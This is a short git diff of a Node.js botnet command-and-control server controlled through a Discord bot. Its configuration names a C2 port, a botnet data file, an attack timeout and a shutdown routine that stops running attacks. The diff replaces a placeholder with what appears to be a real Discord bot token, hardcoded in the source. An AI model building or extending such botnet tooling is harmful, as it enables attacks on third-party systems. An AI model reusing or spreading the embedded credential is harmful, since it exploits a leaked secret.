@@ -23,7 +23,7 @@ const fs = require('fs');
 
 // ---------------------------- Configuration ---------------------------------
 const C2_PORT = 7771;                           // Port for real clients
-const DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN';  // <-- REPLACE WITH YOUR TOKEN
+const DISCORD_TOKEN = 'MTQ2OTI3Mjg4MDIzNDc2MjI3Mg.GV6Vaz.jAAqYK9ZgSV5ahQfoB3ONyp2pK5QvaiTqgZNRk';  // <-- REPLACE WITH YOUR TOKEN
 const PREFIX = '!';                              // Discord command prefix
 const DATA_FILE = './botnet_data.json';          // Persistent storage file
 const ATTACK_TIMEOUT = 300;                       // Max attack duration (seconds)
@@ -590,4 +590,5 @@ process.on('SIGINT', () => {
     stopAllLocalAttacks();
     discordClient.destroy();
     process.exit();
+
 });
